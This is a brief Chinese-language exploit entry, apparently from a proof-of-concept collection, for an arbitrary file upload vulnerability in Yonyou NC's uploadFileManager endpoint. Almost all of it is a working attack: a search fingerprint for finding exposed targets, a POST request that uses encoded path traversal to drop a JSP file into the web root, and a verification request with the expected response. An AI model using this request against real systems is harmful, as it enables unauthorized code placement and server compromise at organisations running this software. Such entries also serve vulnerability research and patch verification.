# 用友NCuploadFileManager存在任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1`

**Payload**
```
--d0b7a0d40eed0e32904c8017b09eb305
Content-Disposition: form-data; name="file"; filename="test123.jsp"
Content-Type: text/plain
Test123
--d0b7a0d40eed0e32904c8017b09eb305--
**验证地址：**
GET /test123.jsp HTTP/1.1
```
- **响应特征**：200 Test123